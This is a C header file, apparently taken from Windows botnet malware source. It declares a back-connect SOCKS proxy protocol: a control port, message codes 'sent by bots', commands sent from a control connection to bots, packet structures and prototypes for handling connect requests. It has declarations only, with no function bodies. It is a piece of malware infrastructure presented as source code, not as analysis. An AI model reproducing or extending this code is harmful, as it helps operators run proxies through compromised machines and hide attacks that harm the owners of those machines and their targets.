#define CRM_BUF_SIZE 1024
#define BACK_SOCKS_VERSION 1
#define SIZEOF_HEADERS 1
//#define SOCKS_BUF_SIZE 32768
#define CONTROLPORT 83

/* msg recieved by control connection, sent by bots */
enum { MSG_INFO = 0xA4, MSG_READY, MSG_ERROR, MSG_BUSY, MSG_RESET, MSG_PONG, MSG_SOCKET };
/* mbscs commands sent by control connection to bots */
enum { CMD_SYN = 0xE1, CMD_PING, CMD_BYE };
/* error messages */
enum { ERR_SYN_TIMEOUT = 0x04, ERR_NO_ROUTE, ERR_RESOURCES, ERR_AGAIN };

struct bscs_conf
{
	char host[128];
	int  port;
};

struct cmd_syn_data
{
	u_char version;
	char hostname[64];
	int port;
	struct sockaddr_in sin;

	char bhostname[64];
	int bport;
	struct sockaddr_in sout;

	int unused1;
	int unused2;
	int unused3;
	int unused4;
};

struct socket_info
{
	u_char version;
	char hostname[64];
	int port;

	int unused1;
	int unused2;
};

#pragma pack(1)
struct msg_info
{
	u_char version;
	struct sockaddr_in host;

	int unused1;
	int unused2;
	int unused3;
	int unused4;
};
#pragma pack()

DWORD WINAPI open_cl(LPVOID pbscs_conf);
char* mkinfo_packet(int *psize);
char* mkmsg_packet(int *psize, u_char msg);
DWORD WINAPI pcr(LPVOID psyndata);
int process_connect_request(struct cmd_syn_data *psyndata);